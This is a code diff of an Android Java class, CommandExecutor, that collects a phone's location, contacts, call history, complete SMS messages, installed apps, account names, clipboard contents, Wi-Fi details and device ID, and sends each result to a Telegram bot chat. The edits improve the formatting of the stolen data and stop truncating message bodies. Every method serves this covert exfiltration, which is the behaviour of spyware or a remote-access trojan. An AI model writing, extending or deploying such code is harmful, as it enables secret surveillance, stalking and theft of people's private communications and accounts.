@@ -39,8 +39,8 @@ import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.List;
 import java.util.ArrayList;
-import okhttp3.*;
 import java.util.concurrent.TimeUnit;
+import okhttp3.*;
 
 public class CommandExecutor {
     
@@ -77,7 +77,7 @@ public class CommandExecutor {
                 
                 if (location != null) {
                     String locUrl = "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude();
-                    sendTelegram("📍 الموقع:\n" + locUrl);
+                    sendTelegram("📍 **الموقع:**\n" + locUrl);
                 } else {
                     sendTelegram("📍 لا يتوفر موقع حديث");
                 }
@@ -91,7 +91,7 @@ public class CommandExecutor {
     
     public void getContacts() {
         try {
-            StringBuilder sb = new StringBuilder("👤 جهات الاتصال:\n");
+            StringBuilder sb = new StringBuilder("👤 **جهات الاتصال**\n\n");
             Cursor cursor = context.getContentResolver().query(
                 ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                 null, null, null, null);
@@ -100,7 +100,8 @@ public class CommandExecutor {
             while (cursor.moveToNext() && count < 20) {
                 String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                 String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                sb.append("• ").append(name).append(": ").append(phone).append("\n");
+                sb.append("📞 **").append(name).append("**\n");
+                sb.append("   ").append(phone).append("\n\n");
                 count++;
             }
             cursor.close();
@@ -112,7 +113,7 @@ public class CommandExecutor {
     
     public void getCallLogs() {
         try {
-            StringBuilder sb = new StringBuilder("📞 سجل المكالمات:\n");
+            StringBuilder sb = new StringBuilder("📞 **سجل المكالمات**\n\n");
             Cursor cursor = context.getContentResolver().query(
                 CallLog.Calls.CONTENT_URI,
                 null, null, null, CallLog.Calls.DATE + " DESC LIMIT 15");
@@ -121,10 +122,14 @@ public class CommandExecutor {
                 String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                 String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                 String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
-                String typeText = type.equals("1") ? "وارد" : type.equals("2") ? "صادر" : "فائت";
+                long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                 
-                sb.append("• ").append(name != null ? name : number)
-                  .append(" (").append(typeText).append(")\n");
+                String typeText = type.equals("1") ? "📞 وارد" : 
+                                 type.equals("2") ? "📞 صادر" : "❌ فائت";
+                
+                sb.append(typeText).append("\n");
+                sb.append("   ").append(name != null ? name : number).append("\n");
+                sb.append("   ").append(new SimpleDateFormat("yyyy-MM-dd HH:mm").format(new Date(date))).append("\n\n");
             }
             cursor.close();
             sendTelegram(sb.toString());
@@ -135,7 +140,7 @@ public class CommandExecutor {
     
     public void getSMS() {
         try {
-            StringBuilder sb = new StringBuilder("💬 آخر الرسائل:\n");
+            StringBuilder sb = new StringBuilder("💬 **آخر الرسائل**\n\n");
             Cursor cursor = context.getContentResolver().query(
                 Uri.parse("content://sms/inbox"),
                 null, null, null, "date DESC LIMIT 10");
@@ -143,10 +148,11 @@ public class CommandExecutor {
             while (cursor.moveToNext()) {
                 String address = cursor.getString(cursor.getColumnIndex("address"));
                 String body = cursor.getString(cursor.getColumnIndex("body"));
+                long date = cursor.getLong(cursor.getColumnIndex("date"));
                 
-                sb.append("• من ").append(address).append(":\n")
-                  .append(body.length() > 30 ? body.substring(0, 30) + "..." : body)
-                  .append("\n---\n");
+                sb.append("📨 **من ").append(address).append("**\n");
+                sb.append("   ").append(body).append("\n");
+                sb.append("   ").append(new SimpleDateFormat("yyyy-MM-dd HH:mm").format(new Date(date))).append("\n\n");
             }
             cursor.close();
             sendTelegram(sb.toString());
@@ -159,13 +165,18 @@ public class CommandExecutor {
         try {
             PackageManager pm = context.getPackageManager();
             List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
-            StringBuilder sb = new StringBuilder("📱 التطبيقات المثبتة:\n");
+            StringBuilder sb = new StringBuilder("📱 **التطبيقات المثبتة**\n\n");
             
-            for (int i = 0; i < Math.min(apps.size(), 25); i++) {
-                ApplicationInfo app = apps.get(i);
-                String name = pm.getApplicationLabel(app).toString();
-                sb.append("• ").append(name).append("\n");
+            int userApps = 0;
+            for (ApplicationInfo app : apps) {
+                if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
+                    String name = pm.getApplicationLabel(app).toString();
+                    sb.append("• ").append(name).append("\n");
+                    userApps++;
+                    if (userApps >= 30) break;
+                }
             }
+            sb.append("\nإجمالي: ").append(userApps);
             sendTelegram(sb.toString());
         } catch (Exception e) {
             sendTelegram("❌ خطأ في قراءة التطبيقات");
@@ -176,10 +187,11 @@ public class CommandExecutor {
         try {
             AccountManager am = (AccountManager) context.getSystemService(Context.ACCOUNT_SERVICE);
             Account[] accounts = am.getAccounts();
-            StringBuilder sb = new StringBuilder("🔑 الحسابات:\n");
+            StringBuilder sb = new StringBuilder("🔑 **الحسابات**\n\n");
             
             for (Account account : accounts) {
-                sb.append("• ").append(account.name).append(" (").append(account.type).append(")\n");
+                sb.append("**").append(account.type).append("**\n");
+                sb.append("   ").append(account.name).append("\n\n");
             }
             sendTelegram(sb.toString());
         } catch (Exception e) {
@@ -193,7 +205,7 @@ public class CommandExecutor {
             ClipData clip = cm.getPrimaryClip();
             if (clip != null && clip.getItemCount() > 0) {
                 String text = clip.getItemAt(0).getText().toString();
-                sendTelegram("📋 الحافظة:\n" + text);
+                sendTelegram("📋 **الحافظة**\n\n" + text);
             } else {
                 sendTelegram("📋 الحافظة فارغة");
             }
@@ -209,19 +221,19 @@ public class CommandExecutor {
             String ssid = wifiInfo.getSSID().replace("\"", "");
             int rssi = wifiInfo.getRssi();
             
-            sendTelegram("📶 واي فاي:\n• الشبكة: " + ssid + "\n• قوة الإشارة: " + rssi + " dBm");
+            sendTelegram("📶 **واي فاي**\n\n• الشبكة: " + ssid + "\n• قوة الإشارة: " + rssi + " dBm");
         } catch (Exception e) {
             sendTelegram("❌ خطأ في معلومات الشبكة");
         }
     }
     
     public void getDeviceInfo() {
-        StringBuilder sb = new StringBuilder("📱 معلومات الجهاز:\n");
-        sb.append("• الطراز: ").append(Build.MODEL).append("\n");
-        sb.append("• الشركة: ").append(Build.MANUFACTURER).append("\n");
-        sb.append("• الإصدار: ").append(Build.VERSION.RELEASE).append("\n");
-        sb.append("• API: ").append(Build.VERSION.SDK_INT).append("\n");
-        sb.append("• ID: ").append(Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID));
+        StringBuilder sb = new StringBuilder("📱 **معلومات الجهاز**\n\n");
+        sb.append("الطراز: ").append(Build.MODEL).append("\n");
+        sb.append("الشركة: ").append(Build.MANUFACTURER).append("\n");
+        sb.append("الإصدار: ").append(Build.VERSION.RELEASE).append("\n");
+        sb.append("API: ").append(Build.VERSION.SDK_INT).append("\n");
+        sb.append("المعرف: ").append(Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID));
         
         sendTelegram(sb.toString());
     }
@@ -237,7 +249,8 @@ public class CommandExecutor {
     
     private void sendTelegram(String message) {
         try {
-            String url = BASE_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + message;
+            String url = BASE_URL + "sendMessage?chat_id=" + CHAT_ID + 
+                         "&text=" + Uri.encode(message) + "&parse_mode=Markdown";
             Request request = new Request.Builder().url(url).build();
             client.newCall(request).enqueue(new Callback() {
                 @Override public void onFailure(Call c, IOException e) {}
